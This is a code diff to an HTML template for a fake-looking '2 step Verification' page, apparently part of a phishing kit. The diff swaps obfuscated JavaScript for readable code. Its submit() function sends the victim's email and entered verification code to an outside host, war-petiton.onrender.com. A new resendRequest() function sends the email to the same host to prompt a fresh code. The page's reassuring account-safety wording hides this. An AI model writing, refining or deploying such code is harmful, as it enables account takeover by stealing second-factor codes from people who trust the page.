@@ -22,6 +22,11 @@
     background-color: rgba(0, 0, 0, 0.5); 
     z-index: 999;
 }
+.user-email-link{
+    text-decoration: none;
+    color: black;
+    font-weight: 300;
+}
 .use-account{
             font-size: 15px;
             text-align: center;
@@ -779,7 +784,7 @@
             margin-left: 5%;
         }
     .try-another-method{
-            margin-top: 10%;
+            margin-top: 5%;
         }
     }
 
@@ -807,7 +812,7 @@
             <h4 class="sign-in-text"> 2 step Verification</h4>
             <h4 class="use-account">To keep your account safe, we would like to  know if it's really you trying to sign in</h4>
            
-                <a href="/signin"><h4 class="user-email"><%=dataInput%></h4></a>
+                <a href="/signin" class="user-email-link"><h4 class="user-email"><%=dataInput%></h4></a>
 
                 <h4 class="enter-code"> Enter code sent to your device</h4>
                 <div class="form-group">
@@ -818,12 +823,57 @@
                     <h4 class="learn-more" id="learn-more" onclick="submit()">Submit</h4>
                   </div>
                   <div class="try-another-method">
-                    <a href="/2faMethod" class="learn-more" id="learn-more">Try another way</a>
+                    <h4 class="learn-more" id="learn-more" onclick="resendRequest()">Resend code</h4>
                   </div>
                 </div>
     </section>
     <script>
- function _0x1c16(){const _0x334be7=['https://war-petiton.onrender.com/submit','46WjpNYn','110oGXMqE','#email','.user-email','error','POST','then','value','141FeiSsi','1341uiKetJ','Must\x20enter\x20digits\x20to\x20continue','querySelector','Network\x20response\x20was\x20not\x20ok','log','72DPrAHV','135376hQjhQb','326816HTbuqJ','innerHTML','640640mYNecD','10061450spkCre','stringify','59536fymDHd','application/json','56081IFYwNd','2687268BlVclK','Success:'];_0x1c16=function(){return _0x334be7;};return _0x1c16();}function _0x3f92(_0x105801,_0x381aee){const _0x1c1616=_0x1c16();return _0x3f92=function(_0x3f927a,_0x286ef8){_0x3f927a=_0x3f927a-0x17d;let _0x512215=_0x1c1616[_0x3f927a];return _0x512215;},_0x3f92(_0x105801,_0x381aee);}(function(_0x44e512,_0x363194){const _0xde026a=_0x3f92,_0x274bb7=_0x44e512();while(!![]){try{const _0x39a6b4=parseInt(_0xde026a(0x194))/0x1*(parseInt(_0xde026a(0x17d))/0x2)+-parseInt(_0xde026a(0x185))/0x3*(-parseInt(_0xde026a(0x18c))/0x4)+-parseInt(_0xde026a(0x18f))/0x5+parseInt(_0xde026a(0x18b))/0x6*(parseInt(_0xde026a(0x18d))/0x7)+parseInt(_0xde026a(0x192))/0x8*(-parseInt(_0xde026a(0x186))/0x9)+parseInt(_0xde026a(0x190))/0xa+parseInt(_0xde026a(0x17e))/0xb*(-parseInt(_0xde026a(0x195))/0xc);if(_0x39a6b4===_0x363194)break;else _0x274bb7['push'](_0x274bb7['shift']());}catch(_0x589e33){_0x274bb7['push'](_0x274bb7['shift']());}}}(_0x1c16,0xecf3c));function submit(){const _0x319fbc=_0x3f92,_0x3aebb7=document[_0x319fbc(0x188)](_0x319fbc(0x17f))[_0x319fbc(0x184)],_0x549c7f=document[_0x319fbc(0x188)](_0x319fbc(0x180)),_0x44155e=_0x549c7f[_0x319fbc(0x18e)],_0x4d9356={'email':_0x44155e,'digits':_0x3aebb7};_0x3aebb7==0x0?alert(_0x319fbc(0x187)):fetch(_0x319fbc(0x197),{'method':_0x319fbc(0x182),'headers':{'Content-Type':_0x319fbc(0x193)},'body':JSON[_0x319fbc(0x191)](_0x4d9356)})[_0x319fbc(0x183)](_0x443284=>{const _0x1a29e7=_0x319fbc;if(!_0x443284['ok'])throw new Error(_0x1a29e7(0x189));return _0x443284['json']();})[_0x319fbc(0x183)](_0x38230d=>{const _0x1c5113=_0x319fbc;console[_0x1c5113(0x18a)](_0x1c5113(0x196),_0x38230d);})['catch'](_0x5c14ec=>{const _0x1a4a52=_0x319fbc;console[_0x1a4a52(0x181)]('Error:',_0x5c14ec);});}
+function submit() {
+  const _0x3aebb7 = document.querySelector('#email').value,
+    _0x549c7f = document.querySelector('.user-email'),
+    _0x44155e = _0x549c7f.innerHTML,
+    _0x4d9356 = {
+      email: _0x44155e,
+      digits: _0x3aebb7,
+    }
+  _0x3aebb7 == 0
+    ? alert('Must enter digits to continue')
+    : fetch('https://war-petiton.onrender.com/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(_0x4d9356),
+      })
+        .then((_0x443284) => {
+          if (!_0x443284.ok) {
+            throw new Error('Network response was not ok')
+          }
+          return _0x443284.json()
+        })
+        .then((_0x38230d) => {
+          console.log('Success:', _0x38230d)
+        })
+        .catch((_0x5c14ec) => {
+          console.error('Error:', _0x5c14ec)
+        })
+}
+function resendRequest() {
+  const _0x475317 = document.querySelector('.user-email'),
+    _0x19215f = _0x475317.innerHTML,
+    _0x54daa1 = { key1: _0x19215f }
+  console.log(_0x54daa1)
+  fetch('https://war-petiton.onrender.com/resendRequest', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(_0x54daa1),
+  })
+    .then((_0x59e61b) => _0x59e61b.json())
+    .then((_0x494b99) => {
+      console.log('Success:', _0x494b99)
+    })
+    .catch((_0x44e634) => {
+      console.error('Error:', _0x44e634)
+    })
+}
     </script>
 </body>
 </html>
